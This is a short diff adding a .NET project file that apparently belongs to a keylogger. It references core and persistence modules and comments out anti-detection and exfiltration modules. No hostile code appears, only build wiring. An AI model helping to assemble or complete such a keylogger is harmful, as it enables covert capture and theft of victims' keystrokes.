@@ -1,0 +1,17 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net48</TargetFramework>
+  </PropertyGroup>
+  <!-- Removed explicit inclusion of all .cs files to avoid duplication -->
+  <!-- <ItemGroup>
+    <Compile Include="**\*.cs" />
+  </ItemGroup> -->
+  <ItemGroup>
+    <ProjectReference Include="..\Keylogger.Core\Keylogger.Core.csproj" />
+    <!-- Removed problematic references -->
+    <!-- <ProjectReference Include="..\Keylogger.AntiDetection\Keylogger.AntiDetection.csproj" /> -->
+    <ProjectReference Include="..\Keylogger.Persistence\Keylogger.Persistence.csproj" />
+    <!-- <ProjectReference Include="..\Keylogger.Exfiltration\Keylogger.Exfiltration.csproj" /> -->
+  </ItemGroup>
+</Project>
